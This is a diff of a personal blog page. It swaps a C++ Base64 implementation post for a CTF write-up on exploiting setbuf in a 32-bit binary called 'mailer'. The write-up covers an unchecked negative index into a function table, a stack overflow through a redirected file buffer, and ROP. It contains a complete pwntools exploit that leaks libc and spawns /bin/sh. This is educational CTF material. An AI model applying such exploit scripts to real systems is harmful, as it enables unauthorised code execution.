@@ -15,20 +15,17 @@
 
 
 
-<meta name="description" content="Base N算法的实现最近在题目中遇到了魔改的base家族，但是，原以为已经了解base家族的我竟然都没有认出来是base家族的算法，实在是菜的真实，因此再花一些时间实现一下base家族的算法">
-<meta name="keywords" content="算法">
+<meta name="description" content="32位PWN setbuf的利用记录一下关于sefbuf函数的利用方式sefbuf一般用来设置文件流的缓冲区，例如setbuf(stdin, 0);会将stdin的缓冲区设置为空，但如果setbuf(stdin,buf)那么stdin的缓冲区将会设置为buf，因此从stdin中读入的数据将从buf中读入。同样，如果setbuf(stdout,buf)，那么向stdout写入的数据也将写到buf中，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Base N">
-<meta property="og:url" content="http://yoursite.com/2019/04/06/Base-N/index.html">
+<meta property="og:title" content="32位PWN栈溢出setbuf的利用">
+<meta property="og:url" content="http://yoursite.com/2019/08/11/32位PWN栈溢出setbuf的利用/index.html">
 <meta property="og:site_name" content="Just a binary noob~~">
-<meta property="og:description" content="Base N算法的实现最近在题目中遇到了魔改的base家族，但是，原以为已经了解base家族的我竟然都没有认出来是base家族的算法，实在是菜的真实，因此再花一些时间实现一下base家族的算法">
+<meta property="og:description" content="32位PWN setbuf的利用记录一下关于sefbuf函数的利用方式sefbuf一般用来设置文件流的缓冲区，例如setbuf(stdin, 0);会将stdin的缓冲区设置为空，但如果setbuf(stdin,buf)那么stdin的缓冲区将会设置为buf，因此从stdin中读入的数据将从buf中读入。同样，如果setbuf(stdout,buf)，那么向stdout写入的数据也将写到buf中，">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190506174854.png">
-<meta property="og:updated_time" content="2019-11-04T09:25:03.869Z">
+<meta property="og:updated_time" content="2019-08-11T06:46:16.928Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Base N">
-<meta name="twitter:description" content="Base N算法的实现最近在题目中遇到了魔改的base家族，但是，原以为已经了解base家族的我竟然都没有认出来是base家族的算法，实在是菜的真实，因此再花一些时间实现一下base家族的算法">
-<meta name="twitter:image" content="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190506174854.png">
+<meta name="twitter:title" content="32位PWN栈溢出setbuf的利用">
+<meta name="twitter:description" content="32位PWN setbuf的利用记录一下关于sefbuf函数的利用方式sefbuf一般用来设置文件流的缓冲区，例如setbuf(stdin, 0);会将stdin的缓冲区设置为空，但如果setbuf(stdin,buf)那么stdin的缓冲区将会设置为buf，因此从stdin中读入的数据将从buf中读入。同样，如果setbuf(stdout,buf)，那么向stdout写入的数据也将写到buf中，">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -60,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Base N | Just a binary noob~~</title>
+<title>32位PWN栈溢出setbuf的利用 | Just a binary noob~~</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -260,11 +257,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-Base-N" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-32位PWN栈溢出setbuf的利用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/04/06/Base-N/" class="article-date">
-      <time datetime="2019-04-06T02:29:58.000Z" itemprop="datePublished">2019-04-06</time>
+      <a href="/2019/08/11/32位PWN栈溢出setbuf的利用/" class="article-date">
+      <time datetime="2019-08-11T05:25:45.000Z" itemprop="datePublished">2019-08-11</time>
 </a>
 
 
@@ -279,7 +276,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Base N
+      32位PWN栈溢出setbuf的利用
     </h1>
   
 
@@ -289,10 +286,6 @@
         
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/算法/">算法</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -300,15 +293,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="Base-N算法的实现"><a href="#Base-N算法的实现" class="headerlink" title="Base N算法的实现"></a>Base N算法的实现</h1><p>最近在题目中遇到了魔改的base家族，但是，原以为已经了解base家族的我竟然都没有认出来是base家族的算法，实在是菜的真实，因此再花一些时间实现一下base家族的算法<br><a id="more"></a></p>
-<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>base64将每三个字节编码为4个字符，每6个bit决定一个字符，因此需要将输入的长度补全为3的倍数，下面这张图能很好的解释<br><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20190506174854.png" alt></p>
-<h3 id="c-实现"><a href="#c-实现" class="headerlink" title="c++实现"></a>c++实现</h3><p>char* table=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“;</p>
-<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base64_encode</span><span class="params">(<span class="keyword">char</span>* st,<span class="keyword">char</span>* s1)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(st);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>* s = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(len+<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++) s[i]=(<span class="keyword">unsigned</span> <span class="keyword">char</span>) st[i];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">strlen</span>(st)%<span class="number">3</span>!=<span class="number">0</span> )</span><br><span class="line">	<span class="keyword">for</span> ( <span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>-<span class="built_in">strlen</span>(st)%<span class="number">3</span>;i++ )&#123;</span><br><span class="line">		s[len]='\x00';</span><br><span class="line">		len++;</span><br><span class="line">	&#125;<span class="comment">//补全为3的倍数</span></span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (j!=len)&#123;</span><br><span class="line">		s1[i] = table[ s[j]&gt;&gt;<span class="number">2</span> ];</span><br><span class="line">		s1[i+<span class="number">1</span>] = table[ (s[j]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">4</span> | (s[j+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>) ];</span><br><span class="line">		s1[i+<span class="number">2</span>] = table[ (s[j+<span class="number">1</span>]&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">2</span> | (s[j+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>) ];</span><br><span class="line">		s1[i+<span class="number">3</span>] = table[ (s[j+<span class="number">2</span>]&amp;<span class="number">0x3f</span>) ];</span><br><span class="line">		i+=<span class="number">4</span>;</span><br><span class="line">		j+=<span class="number">3</span>;<span class="comment">//采用移位与或运算截取每6个bit</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">strlen</span>(st)%<span class="number">3</span>!=<span class="number">0</span> )&#123;</span><br><span class="line">		<span class="keyword">int</span> t = <span class="built_in">strlen</span>(st)%<span class="number">3</span>;</span><br><span class="line">		<span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=<span class="number">3</span>-t;j++)&#123;</span><br><span class="line">			s1[i-j]=<span class="string">'='</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="comment">//一个显然的规律，补一个0x00则需要再末尾添加1个=，补两个0x00则需要再末尾添加2个=</span></span><br><span class="line">	<span class="comment">//因此当需要补N个=时，直接从后往前覆盖掉N位</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">index</span><span class="params">(<span class="keyword">char</span> s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s==<span class="string">'='</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (s==table[i]) <span class="keyword">return</span> i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">base64_decode</span><span class="params">(<span class="keyword">char</span> *st,<span class="keyword">char</span>* s1 )</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(st);</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">if</span> (len%<span class="number">4</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error\n"</span>);<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;len;i+=<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ( j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">		t=(t&lt;&lt;<span class="number">6</span>) | index(st[i+j]); <span class="comment">//将每6个bit组合成24bit也就是3个字节</span></span><br><span class="line">        <span class="keyword">for</span> ( j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span> ((t&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>==<span class="number">0</span>) <span class="keyword">break</span>;<span class="comment">//每次取最高一字节</span></span><br><span class="line">        	s1[i/<span class="number">4</span>*<span class="number">3</span>+j] = (t&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>;</span><br><span class="line">        	t=t&lt;&lt;<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="逆向识别"><a href="#逆向识别" class="headerlink" title="逆向识别"></a>逆向识别</h2><ul>
-<li>识别base家族的关键还是在于table表的识别，其次就是对这个算法的熟悉程度，比如说补齐成指定长度的操作，还有就是长度的收缩(解码)和扩展(编码)</li>
-<li>解码的识别相对要麻烦一些，有很多实现方式，例如在解码过程中可以预先把每个字符在表中的位置存下来，就不需要调用index函数，也可以像编码那样，采用移位与或运算截取其中的片段，而不需要组合成24bit</li>
+        <h1 id="32位PWN-setbuf的利用"><a href="#32位PWN-setbuf的利用" class="headerlink" title="32位PWN setbuf的利用"></a>32位PWN setbuf的利用</h1><p>记录一下关于sefbuf函数的利用方式<br>sefbuf一般用来设置文件流的缓冲区，例如<code>setbuf(stdin, 0);</code>会将stdin的缓冲区设置为空，但如果<code>setbuf(stdin,buf)</code>那么stdin的缓冲区将会设置为buf，因此从stdin中读入的数据将从buf中读入。同样，如果<code>setbuf(stdout,buf)</code>，那么向stdout写入的数据也将写到buf中，</p>
+<p>参考大佬的博客：<a href="https://nobb.site/2017/11/11/0x3D/" target="_blank" rel="noopener">https://nobb.site/2017/11/11/0x3D/</a></p>
+<p>该题的漏洞点在于：读入数据到v3时没有检查v3是否是负数，导致可以任意调用plt表中的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;\nWhich letter do you want to post?&quot;);</span><br><span class="line">  printf(&quot;ID (0-%d): &quot;, 4);</span><br><span class="line">  v4 = read_st_to_int();</span><br><span class="line">  if ( v4 &lt; 0 || v4 &gt; 4 || !*(_DWORD *)(0x108 * v4 + a1) )</span><br><span class="line">    return puts(&quot;Invalid ID.&quot;);</span><br><span class="line">  puts(&quot;\nWhich filter do you want to apply?&quot;);</span><br><span class="line">  sub_80488F8();</span><br><span class="line">  v3 = read_st_to_int();</span><br><span class="line">  if ( v3 &gt; 2 )</span><br><span class="line">    return puts(&quot;Invalid filter.&quot;);</span><br><span class="line">  funcs_8048BB5[v3](s, (void *)(0x108 * v4 + a1 + 8), *(_DWORD *)(0x108 * v4 + a1 + 4));</span><br><span class="line">  return puts(&quot;\nDone!&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>并且，它将post的letters全部写入了文件dev/null</p>
+<p><code>stream = fopen(&quot;/dev/null&quot;, &quot;a&quot;);</code></p>
+<p>因此我们只需要调用<code>setbuf(stream,buf)</code>就能设置这个文件的缓冲区为buf，这样所有对该文件的写入操作<code>fwrite</code>都将写到buf中，这样只要buf在栈上，我们就能通过不断的写入数据造成栈溢出，然后就是很简单的ROP了</p>
+<p>这个题的一些注意点:</p>
+<ul>
+<li>system函数成功执行的两个条件: 1.位于栈上的环境变量不能被覆盖 2.栈上要有大概0x300的空间具有可写入属性，这一点在迁移栈的时候需要注意</li>
+<li>LD_PRELOAD可能会因为libc版本和ld版本不匹配导致段错误，我的做法是本地用自己的libc，远程再用题目给的</li>
+<li>文件流的stdin不为定值，例如<code>fread(buf,1,count,stdin)</code>和<code>read(1,buf,size)</code>中stdin和1并不是对等的关系，1是文件描述符，而stdin是文件流。</li>
 </ul>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">s = lambda data : p.send(data);</span><br><span class="line">sl = lambda data : p.sendline(data);</span><br><span class="line">sla = lambda st,data : p.sendlineafter(st,data);</span><br><span class="line">sa = lambda st,data : p.sendafter(st,data);</span><br><span class="line">uu32 = lambda data :u32(data.ljust(4, &apos;\x00&apos;));</span><br><span class="line">uu64 = lambda data :u64(data.ljust(8, &apos;\x00&apos;));</span><br><span class="line">ru = lambda st,drop=False : p.recvuntil(st,drop=drop);</span><br><span class="line">r = lambda data=4096: p.recv(data);</span><br><span class="line">p = &quot;&quot;;</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;);</span><br><span class="line">elf = ELF(&apos;./mailer&apos;);</span><br><span class="line">context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&apos;debug&apos;);</span><br><span class="line"># p = process(&quot;./mailer&quot;);</span><br><span class="line">p = process(&quot;./mailer&quot;);</span><br><span class="line"></span><br><span class="line">def add(x):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;1&quot;);</span><br><span class="line">    sla(&quot;contents: &quot;,x);</span><br><span class="line">def post(id,x):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;3&quot;);</span><br><span class="line">    sla(&quot;ID (0-4): &quot;,str(id) );</span><br><span class="line">    sla(&quot;apply?&quot;,str(x) );</span><br><span class="line">def delete(id):</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;2&quot;);</span><br><span class="line">    sla(&quot;ID (0-4): &quot;,str(id) );</span><br><span class="line">def exit():</span><br><span class="line">    sla(&quot;&gt; &quot;,&quot;4&quot;);</span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    add(&quot;1234&quot;);</span><br><span class="line">    post( 4 , (elf.got[&apos;setbuf&apos;]-0x0804B048)/4 );   </span><br><span class="line">    delete(0);</span><br><span class="line">    add(&quot;a&quot;*0x100);</span><br><span class="line">    post( 0 , 0 );</span><br><span class="line">    delete(0);</span><br><span class="line">    buf_addr = 0x0804B300</span><br><span class="line">    pop_ebx_ret = 0x08048495;</span><br><span class="line">    leave_ret = 0x08048CFF;</span><br><span class="line">    stdin = 0x2aa5e5a0;</span><br><span class="line">    fake_ebp = buf_addr;</span><br><span class="line">    read_func_addr = 0x80486D9;</span><br><span class="line">    payload = &apos;a&apos;*9+p32(fake_ebp)</span><br><span class="line">    payload += p32(elf.plt[&apos;puts&apos;])+p32(pop_ebx_ret)+p32(elf.got[&apos;puts&apos;]);</span><br><span class="line">    payload += p32( read_func_addr )+p32(leave_ret)+p32(buf_addr)+p32(0xff);</span><br><span class="line">    add( payload );</span><br><span class="line">    post( 0 , 0);</span><br><span class="line">    # gdb.attach(p,&quot;b *0x08048CF7&quot;);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">    ru(&apos;:)\n&apos;);</span><br><span class="line">    puts_addr = uu32(ru(&apos;\xf7&apos;)); </span><br><span class="line">    print &apos;[+] puts_addr: 0x%x&apos;%puts_addr;</span><br><span class="line"></span><br><span class="line">    libc = LibcSearcher(&quot;puts&quot;,puts_addr);</span><br><span class="line">    libc_base = puts_addr - libc.dump(&apos;puts&apos;);</span><br><span class="line">    system_addr = libc_base+libc.dump(&apos;system&apos;);</span><br><span class="line">    # bin_sh_addr = libc_base + libc.dump(&apos;str_bin_sh&apos;);</span><br><span class="line"></span><br><span class="line">    # base_addr = puts_addr - libc.symbols[&apos;puts&apos;];</span><br><span class="line">    # print &apos;[+] base_addr: 0x%x&apos;%base_addr;</span><br><span class="line">    # system_addr = base_addr + libc.symbols[&apos;system&apos;];</span><br><span class="line">    pause();</span><br><span class="line">    sl( &apos;aaaa&apos;+p32(system_addr)+p32(0)+p32(buf_addr+16)+&apos;/bin/sh\x00&apos; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    main();</span><br><span class="line">    pass;</span><br><span class="line">    p.interactive();</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -317,13 +315,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/04/06/Base-N/">Base N</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/11/32位PWN栈溢出setbuf的利用/">32位PWN栈溢出setbuf的利用</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lxf</a></p>
-        <p><span>发布时间:</span>2019-04-06, 10:29:58</p>
-        <p><span>最后更新:</span>2019-11-04, 17:25:03</p>
+        <p><span>发布时间:</span>2019-08-11, 13:25:45</p>
+        <p><span>最后更新:</span>2019-08-11, 14:46:16</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/04/06/Base-N/" title="Base N">http://yoursite.com/2019/04/06/Base-N/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/04/06/Base-N/　　作者: lxf" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/11/32位PWN栈溢出setbuf的利用/" title="32位PWN栈溢出setbuf的利用">http://yoursite.com/2019/08/11/32位PWN栈溢出setbuf的利用/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/11/32位PWN栈溢出setbuf的利用/　　作者: lxf" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -336,15 +334,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/04/22/多表置换密码破解/">
-                    多表置换密码破解
+                <a href="/2019/08/19/SUCTF-Reverse-wp/">
+                    SUCTF Re wp
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/28/CRC算法初探/">
-                    CRC算法初探
+                <a href="/2019/08/05/De1taCTF-Reverse-WP/">
+                    De1taCTF Reverse WP
                 </a>
             </div>
         
@@ -356,7 +354,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Base-N算法的实现"><span class="toc-number">1.</span> <span class="toc-text">Base N算法的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Base64"><span class="toc-number">1.1.</span> <span class="toc-text">Base64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#c-实现"><span class="toc-number">1.1.1.</span> <span class="toc-text">c++实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#编码"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解码"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">解码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逆向识别"><span class="toc-number">1.2.</span> <span class="toc-text">逆向识别</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#32位PWN-setbuf的利用"><span class="toc-number">1.</span> <span class="toc-text">32位PWN setbuf的利用</span></a></li></ol>
         
     </div>
     <style>
@@ -392,7 +390,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Base N　| Just a binary noob~~　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"32位PWN栈溢出setbuf的利用　| Just a binary noob~~　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -412,7 +410,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/04/22/多表置换密码破解/" title="上一篇: 多表置换密码破解">
+            <a href="/2019/08/19/SUCTF-Reverse-wp/" title="上一篇: SUCTF Re wp">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -420,7 +418,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/28/CRC算法初探/" title="下一篇: CRC算法初探">
+            <a href="/2019/08/05/De1taCTF-Reverse-WP/" title="下一篇: De1taCTF Reverse WP">
                 <i class="fa fa-angle-right"></i>
             </a>
         
